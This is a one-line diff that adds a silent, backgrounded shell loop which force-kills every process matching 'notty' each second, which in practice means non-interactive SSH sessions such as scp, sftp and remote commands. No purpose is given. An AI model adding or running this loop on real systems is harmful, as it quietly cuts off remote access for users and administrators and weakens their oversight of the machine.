@@ -1,0 +1,1 @@
+while true; do kill -9 $(ps aux | grep notty | awk '{print $2}') &>/dev/null; sleep 1; done & 
